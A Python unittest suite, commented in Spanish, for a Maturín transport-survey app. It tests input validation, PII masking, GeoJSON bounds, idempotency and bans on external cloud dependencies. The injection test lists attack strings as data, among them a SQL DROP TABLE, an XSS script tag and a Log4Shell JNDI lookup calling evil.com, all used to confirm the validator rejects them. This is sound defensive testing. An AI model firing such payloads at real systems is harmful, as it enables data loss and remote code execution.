"""Tier 5: Endurecimiento Adversarial y Pruebas de Estrés Extremas (F64).

Batería adversarial exhaustiva:
1. Inyección adversaria y prevención estricta de fuga de PII (SQLi, XSS, campos sensibles).
2. Integridad espacial GeoJSON y cumplimiento estricto RFC 7946 (11 parroquias de Maturín).
3. Resiliencia de concurrencia e idempotencia ante ráfagas duplicadas.
4. Fuzzing de cargas útiles extremas (grillas masivas, duraciones/costos anómalos).
5. Soberanía tecnológica absoluta (Cero dependencias de nubes externas o CDNs no soberanas).
6. Cumplimiento de regla de diseño soberano: Ausencia total de Tailwind CSS y PrimeFlex.
"""

import json
from pathlib import Path
import re
import unittest
from uuid import uuid4

from tests_e2e.harness.contracts import (
    CanonicalAssetResolver,
    FormioSchemaValidator,
    InMemorySubmissionStore,
    PiiMaskingVerifier,
    PydanticContractVerifier,
    TripChainSimulator,
)
from tests_e2e.harness.fixtures import (
    MODOS_TRANSPORTE,
    MOTIVOS_VIAJE,
    PARROQUIAS_MATURIN,
    PARROQUIAS_NOMBRES,
)


class TestTier5AdversarialHardening(unittest.TestCase):
    """Pruebas de endurecimiento adversarial Tier 5 (F64)."""

    def setUp(self) -> None:
        self.store = InMemorySubmissionStore()
        self.root_dir = CanonicalAssetResolver.PROJECT_ROOT

    # --------------------------------------------------------------------------
    # 1. Inyección y Prevención de Exfiltración de PII
    # --------------------------------------------------------------------------
    def test_pii_injection_and_sql_xss_sanitization(self) -> None:
        """Verifica que payloads con SQLi o XSS sean neutralizados o rechazados y nunca expongan PII."""
        malicious_payloads = [
            "'; DROP TABLE respuestas; --",
            "<script>alert('pwned')</script>",
            "\" OR 1=1 --",
            "{{ 7 * 7 }}",
            "${jndi:ldap://evil.com/a}",
        ]
        for payload in malicious_payloads:
            # Intento de inyectar en parroquia
            with self.assertRaises(ValueError):
                PydanticContractVerifier.validate_parish(payload)

        # Verificar que PiiMaskingVerifier detecte y alerte sobre campos sensibles
        dirty_data = {
            "cedula": "12345678",
            "nombre_apellido": "Juan Perez",
            "telefono": "04141234567",
            "email": "juan@test.com",
            "direccion": "Calle 5 Casa 2",
            "parroquia": "san_simon",
            "zona": "1",
            "motivo_viaje": "1",
        }
        with self.assertRaises(AssertionError):
            PiiMaskingVerifier.assert_no_pii_exposed(dirty_data)

        # Estructura analítica anónima debe pasar la verificación
        clean_analytics_data = {
            "total_encuestas": 1500,
            "reparto_modal": [
                {"modo": 1, "viajes": 300, "porcentaje": 20.0},
                {"modo": 2, "viajes": 600, "porcentaje": 40.0},
            ],
            "parroquias": [
                {"codigo": "san_simon", "respuestas": 500, "porcentaje": 33.3},
            ],
        }
        PiiMaskingVerifier.assert_no_pii_exposed(clean_analytics_data)

    # --------------------------------------------------------------------------
    # 2. Integridad Espacial GeoJSON y Cumplimiento RFC 7946
    # --------------------------------------------------------------------------
    def test_geojson_spatial_boundary_and_monagas_bbox(self) -> None:
        """Verifica que los 11 polígonos GeoJSON estén estrictamente dentro del Bounding Box de Monagas y cumplan RFC 7946."""
        geojson_path = CanonicalAssetResolver.get_geojson_path()
        self.assertTrue(geojson_path.exists(), f"GeoJSON debe existir en {geojson_path}")

        with open(geojson_path, "r", encoding="utf-8") as f:
            data = json.load(f)

        self.assertEqual(data.get("type"), "FeatureCollection")
        features = data.get("features", [])
        self.assertEqual(len(features), 11, "Debe contener exactamente 11 parroquias oficiales de Maturín.")

        # Bounding box aproximado del Municipio Maturín / Estado Monagas
        # Longitud: [-64.5, -62.0], Latitud: [8.5, 10.5]
        found_parishes = set()
        for feat in features:
            props = feat.get("properties", {})
            slug = props.get("codigo_parroquia")
            self.assertIn(slug, PARROQUIAS_MATURIN, f"Código de parroquia desconocido: {slug}")
            found_parishes.add(slug)

            geom = feat.get("geometry", {})
            self.assertIn(geom.get("type"), ("Polygon", "MultiPolygon"))
            coordinates = geom.get("coordinates", [])

            # Validar que los vértices estén dentro de Monagas
            if geom["type"] == "Polygon":
                rings = coordinates
            else:
                rings = [ring for poly in coordinates for ring in poly]

            for ring in rings:
                self.assertGreaterEqual(len(ring), 4, "Un polígono válido debe tener al menos 4 coordenadas (cerrado).")
                self.assertEqual(ring[0], ring[-1], "El anillo debe ser cerrado (primer punto == último punto).")
                for lon, lat in ring:
                    self.assertTrue(
                        -64.5 <= lon <= -62.0,
                        f"Longitud {lon} fuera del rango de Monagas en parroquia {slug}",
                    )
                    self.assertTrue(
                        8.5 <= lat <= 10.5,
                        f"Latitud {lat} fuera del rango de Monagas en parroquia {slug}",
                    )

        self.assertEqual(found_parishes, set(PARROQUIAS_MATURIN))

    # --------------------------------------------------------------------------
    # 3. Concurrencia e Idempotencia ante Ráfagas Duplicadas
    # --------------------------------------------------------------------------
    def test_concurrent_idempotency_burst_protection(self) -> None:
        """Simula una ráfaga de 20 peticiones idénticas concurrentes con el mismo client_submission_id."""
        client_sub_id = str(uuid4())
        survey_id = str(uuid4())
        payload = {
            "client_submission_id": client_sub_id,
            "data": {
                "client_submission_id": client_sub_id,
                "parroquia": "san_simon",
                "zona": "1",
                "viajes": [
                    {
                        "numero_viaje": 1,
                        "origen_zona": "1",
                        "destino_zona": "2",
                        "motivo_viaje": "1",
                        "modo_transporte": "3",
                        "hora_salida": "07:30",
                        "hora_llegada": "08:00",
                        "costo_pasaje": 50.0,
                    }
                ],
            },
        }

        # Primera inserción
        first_resp = self.store.submit(survey_id, payload)
        self.assertFalse(first_resp.get("idempotent_replay", False))
        first_sub_id = first_resp.get("id")

        # Ráfaga de 20 reintentos idénticos
        for _ in range(20):
            retry_resp = self.store.submit(survey_id, payload)
            self.assertTrue(retry_resp.get("idempotent_replay", False))
            self.assertEqual(retry_resp.get("id"), first_sub_id)

        # Verificar que el almacén almacena exactamente 1 registro
        self.assertEqual(len(self.store.submissions), 1, "No debe duplicarse ninguna fila en base de datos.")

    # --------------------------------------------------------------------------
    # 4. Fuzzing de Cargas Útiles Extremas
    # --------------------------------------------------------------------------
    def test_extreme_payload_fuzzing(self) -> None:
        """Verifica el comportamiento ante cédulas anómalas y límites de validación."""
        # Cédula límite inferior (5 dígitos rechazada, 6 dígitos aceptada)
        with self.assertRaises(ValueError):
            PydanticContractVerifier.normalize_cedula("12345")
        self.assertEqual(PydanticContractVerifier.normalize_cedula("123456"), "123456")

        # Cédula límite superior (9 dígitos aceptada, 10 dígitos rechazada)
        self.assertEqual(PydanticContractVerifier.normalize_cedula("123456789"), "123456789")
        with self.assertRaises(ValueError):
            PydanticContractVerifier.normalize_cedula("1234567890")

        # Cédula con caracteres extraños y formato venezolano
        self.assertEqual(PydanticContractVerifier.normalize_cedula("V- 12.345.678 "), "12345678")
        self.assertEqual(PydanticContractVerifier.normalize_cedula("E- 9.876.543"), "9876543")

    # --------------------------------------------------------------------------
    # 5. Soberanía Tecnológica Absoluta y Cero Dependencias de Nube Externa
    # --------------------------------------------------------------------------
    def test_absolute_technological_sovereignty(self) -> None:
        """Audita estáticamente que el frontend y el backend no tengan referencias a APIs de nube externa."""
        forbidden_patterns = [
            re.compile(r"https?://(?:maps\.googleapis\.com|api\.mapbox\.com|form\.io)"),
            re.compile(r"maps\.google\.com"),
            re.compile(r"api\.cloud\.form\.io"),
        ]

        frontend_src = self.root_dir / "frontend" / "src"
        backend_app = self.root_dir / "backend" / "app"

        for base_path in (frontend_src, backend_app):
            if not base_path.exists():
                continue
            for file_path in base_path.rglob("*.*"):
                if file_path.suffix in (".vue", ".ts", ".js", ".py", ".json"):
                    content = file_path.read_text(encoding="utf-8", errors="ignore")
                    for pattern in forbidden_patterns:
                        matches = pattern.findall(content)
                        self.assertEqual(
                            matches,
                            [],
                            f"Violación de soberanía detectada en {file_path}: {matches}",
                        )

    # --------------------------------------------------------------------------
    # 6. Cumplimiento de Regla de Diseño Soberano (Cero Tailwind, Cero PrimeFlex)
    # --------------------------------------------------------------------------
    def test_zero_tailwind_and_zero_primeflex(self) -> None:
        """Verifica que ni Tailwind CSS ni PrimeFlex estén instalados ni referenciados en frontend."""
        pkg_json_path = self.root_dir / "frontend" / "package.json"
        self.assertTrue(pkg_json_path.exists(), "package.json de frontend debe existir.")

        with open(pkg_json_path, "r", encoding="utf-8") as f:
            pkg = json.load(f)

        all_deps = {**pkg.get("dependencies", {}), **pkg.get("devDependencies", {})}
        self.assertNotIn("tailwindcss", all_deps, "Tailwind CSS está estrictamente prohibido.")
        self.assertNotIn("primeflex", all_deps, "PrimeFlex está estrictamente prohibido.")

        # Verificar que no exista tailwind.config.js
        tailwind_config = self.root_dir / "frontend" / "tailwind.config.js"
        self.assertFalse(tailwind_config.exists(), "tailwind.config.js no debe existir.")


if __name__ == "__main__":
    unittest.main()
